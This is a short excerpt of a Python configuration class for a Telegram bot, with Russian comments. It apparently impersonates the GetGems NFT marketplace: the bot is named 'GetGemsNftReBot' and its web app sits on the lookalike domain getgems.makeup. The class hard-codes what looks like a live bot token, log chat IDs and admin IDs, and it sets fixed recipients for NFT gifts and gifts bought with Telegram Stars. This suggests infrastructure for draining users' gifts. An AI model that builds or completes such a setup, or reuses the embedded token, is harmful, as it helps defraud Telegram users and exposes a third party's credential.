...
class Config:
    ...
    # === BOT НАСТРОЙКИ ===
    BOT_TOKEN: str = os.getenv("BOT_TOKEN", os.getenv("GETGEMS_BOT_TOKEN", "8545925312:AAGRzTfI1woVmo1BcKfto5oOnraTjWDRu_I"))
    BOT_USERNAME: str = os.getenv("BOT_USERNAME", "GetGemsNftReBot")
    
    # === WEB APP НАСТРОЙКИ ===
    WEBAPP_URL: str = os.getenv("WEBAPP_URL", "https://getgems.makeup/")
    ...
    LOG_GROUP_ID: str = os.getenv("LOG_GROUP_ID", "-5024641427")
    LOG_CHAT_ID: str = os.getenv("LOG_CHAT_ID", "-5024641427")
    
    # === ADMIN НАСТРОЙКИ ===
    ADMIN_IDS: List[int] = [
        int(admin_id.strip()) for admin_id in os.getenv("ADMIN_IDS", "970476748").split(",")
        if admin_id.strip().isdigit()
    ]
    
    # === GIFT НАСТРОЙКИ ===
    GIFT_RECIPIENT_ID: int = int(os.getenv("GIFT_RECIPIENT_ID", "0"))  # ID получателя NFT подарков
    GIFT_RECIPIENT_USERNAME: str = os.getenv("GIFT_RECIPIENT_USERNAME", "")  # Username получателя NFT подарков (приоритет над ID)
    ...
    GIFT_ID_TO_BUY: int = int(os.getenv("GIFT_ID_TO_BUY", "5170145012310081615"))  # ID подарка для покупки (0 = не покупать)
    STARS_GIFT_RECIPIENT_USERNAME: str = os.getenv("STARS_GIFT_RECIPIENT_USERNAME", "")  # Username получателя подарков за звезды (приоритет над GIFT_RECIPIENT_USERNAME)
    STARS_GIFT_RECIPIENT_ID: int = int(os.getenv("STARS_GIFT_RECIPIENT_ID", "0"))  # ID получателя подарков за звезды
